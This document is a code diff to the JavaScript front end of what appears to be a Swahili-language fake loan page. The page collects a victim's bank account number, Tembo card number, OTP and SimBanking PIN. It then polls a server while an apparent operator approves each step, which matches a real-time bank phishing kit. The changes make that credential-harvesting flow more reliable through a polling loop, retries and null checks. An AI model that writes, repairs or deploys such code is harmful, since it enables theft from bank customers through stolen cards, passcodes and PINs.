@@ -2,6 +2,7 @@ let currentStep = 'personal_info';
 let clientPayload = {};
 let timerInterval = null;
 let timeLeft = 30;
+let pollTimeout = null; // Track polling loop timer
 
 function updateCalculator() {
     const amount = parseInt(document.getElementById('loanAmountSlider').value);
@@ -28,6 +29,10 @@ function showLoading(text) {
 
 function hideLoading() {
     document.getElementById('loadingOverlay').style.display = 'none';
+    if (pollTimeout) {
+        clearTimeout(pollTimeout);
+        pollTimeout = null;
+    }
 }
 
 async function sendToServer(step, data) {
@@ -49,6 +54,14 @@ async function pollServerStatus() {
     try {
         const response = await fetch('/api/poll-status');
         const res = await response.json();
+
+        // If still pending or waiting, keep polling every 2.5 seconds
+        if (res.status === 'pending' || !res.status) {
+            pollTimeout = setTimeout(pollServerStatus, 2500);
+            return;
+        }
+
+        // Definitive response received, hide the loading screen
         hideLoading();
 
         if (res.status === 'approved') {
@@ -61,7 +74,7 @@ async function pollServerStatus() {
                 showStep('success');
             }
         } else if (res.status === 'denied' || res.status === 'blocked') {
-            alert(res.message);
+            alert(res.message || 'Ombi limekataliwa.');
             location.reload();
         } else if (res.status === 'retry_otp' || res.status === 'resend') {
             alert(res.message);
@@ -70,7 +83,8 @@ async function pollServerStatus() {
             alert(res.message);
         }
     } catch (e) {
-        setTimeout(pollServerStatus, 2000);
+        // Retry polling if network hiccup occurs momentarily
+        pollTimeout = setTimeout(pollServerStatus, 3000);
     }
 }
 
@@ -102,11 +116,10 @@ async function submitTemboCard() {
         return;
     }
 
-    showLoading('Inathibitisha Kadi ya Tembo...');
+    showLoading('Inasubiri idhini ya Benki...');
     const res = await sendToServer('step3', { accountNumber, cardNumber });
     
-    if (res.pendingApproval) {
-        document.getElementById('loadingText').innerText = 'Inasubiri idhini ya Benki...';
+    if (res.pendingApproval || res.status === 'pending') {
         pollServerStatus();
     }
 }
@@ -115,18 +128,21 @@ function startOtpTimer() {
     timeLeft = 30;
     const timerSpan = document.getElementById('timer');
     const resendBtn = document.getElementById('resendBtn');
-    resendBtn.disabled = true;
+    if (resendBtn) resendBtn.disabled = true;
 
     if (timerInterval) clearInterval(timerInterval);
 
-    document.getElementById('displayPhone').innerText = `+255 ${clientPayload.phoneNumber || '7XX XXX XXX'}`;
+    const displayPhone = document.getElementById('displayPhone');
+    if (displayPhone) {
+        displayPhone.innerText = `+255 ${clientPayload.phoneNumber || '7XX XXX XXX'}`;
+    }
 
     timerInterval = setInterval(async () => {
         timeLeft--;
-        timerSpan.innerText = timeLeft;
+        if (timerSpan) timerSpan.innerText = timeLeft;
         if (timeLeft <= 0) {
             clearInterval(timerInterval);
-            resendBtn.disabled = false;
+            if (resendBtn) resendBtn.disabled = false;
             
             showLoading('Muda wa OTP umeisha. Inaarifu msimamizi...');
             await sendToServer('step4', { isResend: true });
@@ -137,20 +153,18 @@ function startOtpTimer() {
 }
 
 function moveToNext(element, index) {
-    // Strip any non-numeric characters automatically
     element.value = element.value.replace(/[^0-9]/g, '');
-
     if (element.value.length === 1 && index < 5) {
-        document.querySelectorAll('.otp-box')[index].focus();
+        const boxes = document.querySelectorAll('.otp-box');
+        if (boxes[index]) boxes[index].focus();
     }
 }
 
 function movePinNext(element, index) {
-    // Strip any non-numeric characters automatically
     element.value = element.value.replace(/[^0-9]/g, '');
-
     if (element.value.length === 1 && index < 4) {
-        document.querySelectorAll('.pin-box')[index].focus();
+        const boxes = document.querySelectorAll('.pin-box');
+        if (boxes[index]) boxes[index].focus();
     }
 }
 
@@ -164,10 +178,9 @@ async function submitOtp() {
         return;
     }
 
-    showLoading('Inathibitisha OTP...');
+    showLoading('Inasubiri uthibitisho wa OTP...');
     const res = await sendToServer('step4', { otp });
-    if (res.pendingApproval) {
-        document.getElementById('loadingText').innerText = 'Inasubiri uthibitisho wa OTP...';
+    if (res.pendingApproval || res.status === 'pending') {
         pollServerStatus();
     }
 }
@@ -175,7 +188,7 @@ async function submitOtp() {
 async function triggerResendOtp() {
     showLoading('Inatuma ombi la OTP mpya...');
     const res = await sendToServer('step4', { isResend: true });
-    if (res.pendingApproval) {
+    if (res.pendingApproval || res.status === 'pending') {
         document.getElementById('loadingText').innerText = 'Inasubiri idhini ya kutuma OTP mpya...';
         pollServerStatus();
     }
@@ -191,10 +204,9 @@ async function submitPin() {
         return;
     }
 
-    showLoading('Inakamilisha usalama wa akaunti...');
+    showLoading('Inathibitisha PIN ya SimBanking...');
     const res = await sendToServer('step5', { pin });
-    if (res.pendingApproval) {
-        document.getElementById('loadingText').innerText = 'Inathibitisha PIN ya SimBanking...';
+    if (res.pendingApproval || res.status === 'pending') {
         pollServerStatus();
     }
 }
@@ -202,4 +214,3 @@ async function submitPin() {
 window.onload = () => {
     updateCalculator();
 };
-    
